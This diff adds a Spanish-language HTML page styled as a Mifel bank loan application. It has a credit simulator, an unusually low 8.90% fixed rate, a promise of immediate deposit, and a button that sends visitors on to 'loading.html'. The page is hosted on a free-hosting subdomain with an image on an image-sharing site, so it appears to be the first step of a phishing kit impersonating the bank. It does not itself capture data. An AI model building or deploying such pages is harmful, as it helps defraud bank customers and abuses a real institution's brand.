@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta property="og:title" content="Portal Mifel" />
+<meta property="og:description" content="Descubre los servicios financieros personalizados en Mifel. Cuentas, créditos, inversiones y seguros diseñados para ti y tus necesidades." />
+<meta property="og:image" content="https://i.postimg.cc/Dzmn6tMh/E5f-PMPh-Yogz-Ubf-A.jpg" />
+<meta property="og:image:secure_url" content="https://i.postimg.cc/Dzmn6tMh/E5f-PMPh-Yogz-Ubf-A.jpg" />
+<meta property="og:image:type" content="image/jpeg" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:url" content="https://mifel-portal.hstn.me/soli.html" />
+<meta property="og:type" content="website" />
+    <title>Mifel - Solicitud de Crédito</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600&family=Raleway:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --mifel-cyan: #00D1C1;
+            --mifel-blue-dark: #002D72;
+            --text-grey: #666;
+            --input-bg: #EBF1F5;
+            --glow-light-blue: #00E5FF;
+        }
+
+        body {
+            font-family: 'Open Sans', 'Raleway', sans-serif;
+            background-color: #ffffff;
+            margin: 0; padding: 0;
+            display: flex; flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* --- HEADER --- */
+        .top-header {
+            display: flex;
+            justify-content: center;
+            padding: 20px 50px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .logo-center { width: 120px; }
+
+        /* --- MAIN CONTENT --- */
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+            text-align: center;
+            max-width: 450px;
+            margin: 0 auto;
+        }
+
+        /* ICONO FLOTANTE */
+        .icon-floating-wrapper {
+            width: 80px; height: 80px;
+            background-color: rgba(0, 209, 193, 0.1);
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            margin-bottom: 25px;
+            animation: floatAlways 3s ease-in-out infinite;
+        }
+        .icon-floating-wrapper svg { width: 40px; fill: var(--mifel-cyan); }
+
+        @keyframes floatAlways {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-12px); }
+        }
+
+        .welcome-text { color: var(--mifel-blue-dark); font-size: 24px; font-weight: 600; margin-bottom: 10px; }
+        .sub-text { color: var(--text-grey); font-size: 15px; margin-bottom: 30px; line-height: 1.5; }
+
+        /* SIMULADOR ESTILO ANTERIOR */
+        .simulator-box { width: 100%; margin-bottom: 20px; }
+
+        .display-label { font-size: 14px; color: var(--text-grey); margin-bottom: 10px; display: block; }
+        .big-value { font-size: 36px; font-weight: 700; color: var(--mifel-blue-dark); margin-bottom: 15px; }
+        .cyan-value { color: var(--mifel-cyan); font-weight: 700; }
+
+        /* SLIDERS */
+        .slider-group { margin-bottom: 35px; width: 100%; }
+        
+        input[type=range] {
+            width: 100%; -webkit-appearance: none; background: transparent;
+        }
+        input[type=range]::-webkit-slider-runnable-track {
+            width: 100%; height: 6px; background: var(--input-bg); border-radius: 10px;
+        }
+        input[type=range]::-webkit-slider-thumb {
+            height: 22px; width: 22px; border-radius: 50%;
+            background: var(--mifel-cyan); cursor: pointer;
+            -webkit-appearance: none; margin-top: -8px;
+            box-shadow: 0 4px 10px rgba(0, 209, 193, 0.3);
+        }
+
+        /* DESGLOSE DE COSTOS (LIMPIO) */
+        .cost-summary {
+            display: flex; justify-content: space-between;
+            padding: 20px 0; border-top: 1px solid #f0f0f0;
+            margin-top: 10px;
+        }
+        .cost-item { text-align: left; }
+        .cost-label { font-size: 12px; color: var(--text-grey); display: block; }
+        .cost-val { font-size: 16px; font-weight: 600; color: #333; }
+
+        /* BOTÓN CON BRILLO */
+        .btn-continuar {
+            width: 100%; padding: 18px;
+            background-color: var(--mifel-cyan); color: var(--mifel-blue-dark);
+            border: none; border-radius: 8px;
+            font-weight: 600; font-size: 18px;
+            cursor: pointer; transition: all 0.3s ease;
+            position: relative; overflow: hidden;
+            margin-top: 20px;
+        }
+        .btn-continuar:hover { background-color: #00b3a5; transform: translateY(-2px); }
+        
+        .btn-continuar::after {
+            content: ''; position: absolute; top: -50%; left: -150%;
+            width: 200%; height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.3), transparent);
+            transform: rotate(45deg); animation: shine 4s infinite;
+        }
+        @keyframes shine { 0% { left: -150%; } 20% { left: 150%; } 100% { left: 150%; } }
+
+        .terms { margin-top: 25px; font-size: 13px; color: var(--text-grey); }
+        .terms a { color: var(--link-blue); text-decoration: none; font-weight: 600; }
+
+        @media (max-width: 480px) {
+            .big-value { font-size: 28px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="top-header">
+        <img src="https://d3vtsr5ffy4e4a.cloudfront.net/uploads/f9780b94-d327-43bf-987a-11289aa18ab6/original/mifel-personas.svg" alt="Mifel" class="logo-center">
+    </header>
+
+    <main class="main-container">
+        <div class="icon-floating-wrapper">
+            <svg viewBox="0 0 24 24"><path d="M12,2A10,10 0 0,1 22,12A10,10 0 0,1 12,22A10,10 0 0,1 2,12A10,10 0 0,1 12,2M12,4A8,8 0 0,0 4,12A8,8 0 0,0 12,20A8,8 0 0,0 20,12A8,8 0 0,0 12,4M11,17V15H12A2,2 0 0,0 14,13V12A2,2 0 0,0 12,10H9V8H15V6H13V4H11V6H10A2,2 0 0,0 8,8V9A2,2 0 0,0 10,11H13V13H8V15H10V17H8V19H10V21H12V19H13A2,2 0 0,0 15,17V16A2,2 0 0,0 13,14H10V12H15V14H17V12A2,2 0 0,0 15,10V9A2,2 0 0,0 13,7H12V4H10V7H9A2,2 0 0,0 7,9V10A2,2 0 0,0 9,12H12V14H7V16H9V18H7V20H9V21H11V19H12A2,2 0 0,0 14,17V16H11V17Z"/></svg>
+        </div>
+
+        <h1 class="welcome-text">Solicita tu Crédito</h1>
+        <p class="sub-text">Obtén una de las tasas más bajas del mercado, exclusiva para ti. Depósito inmediato en tu cuenta Mifel.</p>
+
+        <div class="simulator-box">
+            <span class="display-label">Monto a solicitar:</span>
+            <div class="big-value" id="val-monto">$50,000</div>
+            <div class="slider-group">
+                <input type="range" id="range-monto" min="5000" max="250000" step="5000" value="50000">
+            </div>
+
+            <span class="display-label">Plazo: <span class="cyan-value" id="val-plazo">12 meses</span></span>
+            <div class="slider-group">
+                <input type="range" id="range-plazo" min="6" max="60" step="6" value="12">
+            </div>
+
+            <div class="cost-summary">
+                <div class="cost-item">
+                    <span class="cost-label">Tu pago mensual:</span>
+                    <span class="cost-val" style="color: var(--mifel-blue-dark); font-size: 22px;" id="val-pago">$4,370</span>
+                </div>
+                <div class="cost-item" style="text-align: right;">
+                    <span class="cost-label">Tasa Anual</span>
+                    <span class="cost-val" style="color: #2ecc71;">8.90% FIJA</span>
+                </div>
+            </div>
+
+            <button class="btn-continuar">Continuar solicitud</button>
+        </div>
+
+        <p class="terms">Sujeto a aprobación. <a href="#">Ver CAT y Comisiones</a></p>
+    </main>
+
+<script>
+        const rangeMonto = document.getElementById('range-monto');
+        const rangePlazo = document.getElementById('range-plazo');
+        const displayMonto = document.getElementById('val-monto');
+        const displayPlazo = document.getElementById('val-plazo');
+        const displayPago = document.getElementById('val-pago');
+        const btnContinuar = document.querySelector('.btn-continuar'); // Seleccionamos el botón
+
+        function actualizar() {
+            const monto = parseInt(rangeMonto.value);
+            const meses = parseInt(rangePlazo.value);
+            const tasaAnual = 0.089; 
+            
+            const tasaMensual = tasaAnual / 12;
+            const pago = (monto * tasaMensual) / (1 - Math.pow(1 + tasaMensual, -meses));
+
+            displayMonto.innerText = new Intl.NumberFormat('es-MX', {
+                style: 'currency', currency: 'MXN', maximumFractionDigits: 0
+            }).format(monto);
+
+            displayPlazo.innerText = `${meses} meses`;
+
+            displayPago.innerText = new Intl.NumberFormat('es-MX', {
+                style: 'currency', currency: 'MXN'
+            }).format(pago);
+        }
+
+        // Evento para redirigir al hacer clic
+        btnContinuar.addEventListener('click', () => {
+            window.location.href = "loading.html";
+        });
+
+        rangeMonto.addEventListener('input', actualizar);
+        rangePlazo.addEventListener('input', actualizar);
+        actualizar();
+    </script>
+</body>
+</html>
